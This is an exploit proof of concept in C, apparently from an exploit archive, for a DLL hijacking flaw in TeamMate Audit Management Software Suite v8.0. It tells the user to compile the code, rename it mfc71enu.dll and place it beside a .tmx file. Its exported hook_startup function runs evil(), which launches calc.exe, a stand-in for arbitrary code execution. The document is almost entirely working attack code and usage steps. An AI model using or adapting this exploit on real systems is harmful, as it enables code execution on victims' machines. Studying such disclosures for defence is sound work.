/*
# Greetz to :b0nd, Fbih2s,r45c4l,Charles ,j4ckh4x0r, punter,eberly, Charles, Dinesh Arora , Anirban ,Ganesha, Dinesh Arora
# Site : www.beenuarora.com

Exploit Title: TeamMate Audit Management Software Suite DLL Hijacking
Date: 25/08/2010
Author: Beenu Arora
Tested on: Windows XP SP3 , TeamMate Audit Management Software Suite v8.0
patch 2
Vulnerable extensions: tmx

Compile and rename to mfc71enu.dll, create a file in the same dir with one
of the following extensions:
.tmx
*/

#include <windows.h>
#define DLLIMPORT __declspec (dllexport)

DLLIMPORT void hook_startup() { evil(); }

int evil()
{
  WinExec("calc", 0);
  exit(0);
  return 0;
}

// POC: http://www.exploit-db.com/sploits/14747.zip